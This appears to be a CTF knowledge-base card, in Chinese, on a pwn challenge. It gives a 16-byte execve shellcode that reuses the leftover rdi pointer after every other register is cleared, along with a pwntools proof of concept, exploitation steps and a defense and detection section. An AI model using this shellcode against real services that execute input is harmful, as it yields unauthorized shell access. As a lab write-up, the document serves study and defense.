---
id: ctf-pwn-minishell-cleared-registers-rdi-residual-execve
title: 寄存器与栈被全清空的极简 execve shellcode：借保留的 rdi 指向输入 buffer，mov al,59; add rdi,8; syscall 直接拿 shell
type: scenario
domain: ctf
path: ctf/pwn
technique: cleared-regs-rdi-residual-tiny-execve-shellcode
tags:
- pwn
- shellcode
- execve
- register-cleared
- rsp-zero
- x86-64
- syscall
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-12
  verified_at: '2026-11-08T07:18:07+08:00'
  notes: 已对照原文核对：图01 cat=mmap64(0x10000000)+read 21 字节+exec(v1)，图02 exec 仅 xor rax..r15/rsp/rbp 后 jmp rdi，rdi 保留，8 字节 mov al,59;add rdi,8;syscall + /bin/sh 共 16 字节语义成立。未验证点：原文仅文字称本地与远程都可通，无 shell 交互截图。
url: /docs/ctf/pwn/ctf-pwn-minishell-cleared-registers-rdi-residual-execve/
draft: false
kb_aliases:
- 清空寄存器 shellcode
- RSP 清零 shellcode
- 极简 execve shellcode
- minishell cat shellcode
- rdi 残留指向 buffer
---

## 一句话结论

当程序把用户输入当作 shellcode 执行，但执行前把几乎所有寄存器（含 `rsp`、`rbp`）都异或清零、导致栈完全不可用时，只要 `rdi` 仍保留指向输入缓冲区起始，就可以用 8 字节指令 `mov al,59; add rdi,8; syscall` 后紧跟 `/bin/sh\0` 完成 `execve("/bin/sh", NULL, NULL)`：清零后的 `rsi`/`rdx` 正好充当 argv/envp 的 NULL，`rdi+8` 跳过前 8 字节指令指向 `/bin/sh`，无需栈、无需 libc 地址、无需泄露。

## 原理

- **题目给出的执行原语**：`cat()` 用 `v1 = mmap64(0x10000000, 21)` 映射 21 字节可执行页，`read(0, v1, 21)` 读入用户输入，然后 `exec(v1)` 跳转执行。因此输入就是 shellcode，长度上限 21 字节。
- **为什么普通 shellcode 失效**：`exec` 的反汇编依次 `xor rax,rax`…`xor r15,r15`、`xor rsp,rsp`、`xor rbp,rbp`，最后 `jmp rdi`。通用寄存器与栈指针全为 0，`rsp=0` 意味着不能 push/pop/call、不能往栈上写字符串，常规 `shellcraft.sh()`（需栈或较长字节）无法使用；也不能靠 `mov rsp, fs:[0x300]` 之类恢复栈（作者本地能通、远程不通）。
- **关键残留：rdi 没被清零**：`exec` 开头是 `mov [rbp+var_8], rdi` 把 rdi 保存起来，之后 `jmp rdi` 用 rdi 跳到 mmap 页执行。因为跳转目标就是输入缓冲区，进入 shellcode 时 `rdi` 仍指向缓冲区首地址（即 shellcode 第 0 字节）。
- **为什么 8 字节指令 + 字符串能 execve**：
  - `mov al, 59`：只改 rax 低字节为 59（x86-64 `execve` 系统调用号），其余位已被清零，故 rax=59。
  - `add rdi, 8`：这 3 条指令机器码共 8 字节（`b0 3b` + `48 83 c7 08` + `0f 05`），`rdi += 8` 后恰好指向紧跟其后的 `/bin/sh\0`。
  - `syscall`：此时 `rdi` = 指向 `/bin/sh` 的指针，`rsi=0`、`rdx=0`（已被 exec 清零），正是 `execve("/bin/sh", NULL, NULL)`。
- **长度**：8 字节指令 + 8 字节 `/bin/sh\0` = 16 字节，落在 21 字节限制内；`sl(shellcode)` 一次发送即可，不需要二阶段 read。文中先试的 `mov rsp, fs:[0x300]` 恢复栈再 read 的二段方案本地通、远程不通，改为这段极简 shellcode 后本地与远程都通。

## 触发条件

- 程序把可控输入放到可执行内存并直接跳转执行（mmap RWX / mprotect RX）。
- 执行前清空通用寄存器与 `rsp`/`rbp`，但保留 `rdi` 指向输入缓冲区（或等价地有寄存器指向可控数据）。
- 允许 `syscall` 指令与 `execve`（无 seccomp 拦截、无字节白名单过滤）。
- 输入长度足够容纳「跳转指令 + `/bin/sh\0`」（本题 21 字节）。

## 利用步骤

1. 逆向 `exec`/跳板，确认哪些寄存器被清零、哪个寄存器仍指向输入缓冲区、是否 `rsp=0`。
2. 计算前缀指令的机器码长度 L，把 `/bin/sh\0` 紧跟其后，用 `add <指向buffer的寄存器>, L` 让它指向字符串。
3. 用最小指令设置 `rax=59`（`mov al,59`），若 `rsi`/`rdx` 未清零则一并清零（本题已由程序完成）。
4. `syscall` 触发 execve；随后直接 `p.interactive()` 收发命令。

## PoC

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
p = remote('<target>', 42114)          # 或 process('./minishell')
p.recvuntil(b'minishell$')
p.sendline(b'cat')                      # 进入 cat()，等待 read 的 21 字节 shellcode

shellcode = asm('''
    mov al, 59        /* b0 3b            : execve 系统调用号 */
    add rdi, 8        /* 48 83 c7 08      : rdi 原本指向 shellcode 起点，+8 指向 /bin/sh */
    syscall           /* 0f 05            : rsi=rdx=0 已由 exec 清零 */
''') + b'/bin/sh\x00'

assert len(shellcode) <= 21
p.sendline(shellcode)
p.interactive()
```

进入 shellcode 时寄存器状态（由 `exec` 决定）：`rax=rbx=rcx=rdx=rsi=r8..r15=rsp=rbp=0`，`rdi` = mmap 页首地址。`add rdi,8` 后 `rdi` 指向 `/bin/sh`，`syscall` 执行 `execve("/bin/sh", 0, 0)`。

## 变体与关联

- **栈不可用时的其它解法**：先用 `mov rsp, fs:[0x300]` 恢复栈再 `read` 二段加载完整 shellcode（作者本地通、远程不通）；若还有寄存器残留 libc 指针，可借 `xmm7` 等取回 libc 与现成 `syscall` gadget，见 [[binary-pwn-sandbox-escape-xmm7-residual-libc-24byte-shellcode]]。
- **短 shellcode 族**：10 字节 `read` 覆盖自身 + `jmp` 回跳的分段加载（[[binary-pwn-sandbox-escape-tiny-shellcode-read-self-loop-staging]]）、纯 ASCII/可见字符 shellcode、自修改 shellcode 绕过 syscall 字节扫描（[[binary-pwn-sandbox-escape-self-modifying-shellcode-seccomp-orw]]）。
- **若有 seccomp 禁 execve**：改用 ORW（openat/read/write）或 `execveat` 等，见 sandbox-escape 节点相关卡。
- 本题与 2025 VNCTF 同类题思路相同（清空寄存器后借残留寄存器完成 execve），作者复用其极简 shellcode。

## 检测与防御

- **不要执行用户输入**：把用户输入当数据而非代码；若必须 JIT，使用受控指令白名单与沙箱（seccomp 禁 execve/execveat、禁 mmap RWX）。
- **跳板清理**：进入不可信代码前清零所有寄存器与 xmm/ymm、栈指针、以及指向输入缓冲区的指针，避免残留可用地址；代码页改 RX 而非 RWX，执行前后校验。
- **限制**：对 shellcode 做长度与字节特征检测（syscall 字节 `0f 05`、`b0 3b`、`/bin/sh`），但字节过滤可被编码绕过，根本措施仍是权限收敛与沙箱。
- **检测**：监控进程出现 `mmap(PROT_EXEC)` 后紧跟 `execve("/bin/sh")`、栈指针异常为 0、以及来自非交互输入的 shell 进程。
